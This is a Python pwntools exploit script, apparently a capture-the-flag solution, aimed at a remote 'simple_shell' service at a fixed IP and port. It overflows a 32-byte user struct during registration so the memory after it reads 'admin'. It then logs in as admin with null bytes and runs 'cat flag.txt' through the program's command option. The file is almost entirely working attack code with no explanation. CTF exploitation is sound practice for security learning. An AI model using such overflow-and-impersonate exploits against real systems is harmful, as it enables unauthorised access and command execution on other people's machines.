#!/usr/bin/env python3
from pwn import *
from pwnlib.util.fiddling import xor

# Set up the process
# context.log_level = 'debug'

# Connect to the program
# p = process('./simple_shell')

# Connect to server
p = remote('140.113.207.245', 30172)

def register(username, password):
    p.recvuntil(b'> ')
    p.sendline(b'2')  # Choose register
    p.recvuntil(b'> ')
    p.sendline(username)
    p.recvuntil(b'> ')
    p.sendline(password)

def login(username, password):
    p.recvuntil(b'> ')
    p.sendline(b'1')  # Choose login
    p.recvuntil(b'> ')
    p.sendline(username)
    p.recvuntil(b'> ')
    p.sendline(password)

def exec_command(cmd):
    p.recvuntil(b'> ')
    p.sendline(b'3')  # Choose exec
    p.recvuntil(b'> ')
    # Send command character by character
    for c in cmd:
        p.send(bytes([c]))
    p.sendline(b'')  # Send newline at the end
    return p.recvline().decode().strip()  # Return the output

# Create a payload that will overflow the buffer
# The User struct is 32 bytes (16 for username + 16 for password)
# We'll send 32 bytes to overflow into the next memory region

# First register a user with our payload
reg_username = b'A' * 16
reg_password = b'A' * 16
reg_password += b'admin' + b'\0'
register(reg_username, reg_password)

# Then try to login with the same credentials
login(b"admin", b"\x00" * 16)

# Try to execute a command to get the flag
flag = exec_command(b'cat flag.txt')
print(f"\033[93;1mFlag: {flag}\033[0m")

# Close the process
p.close()
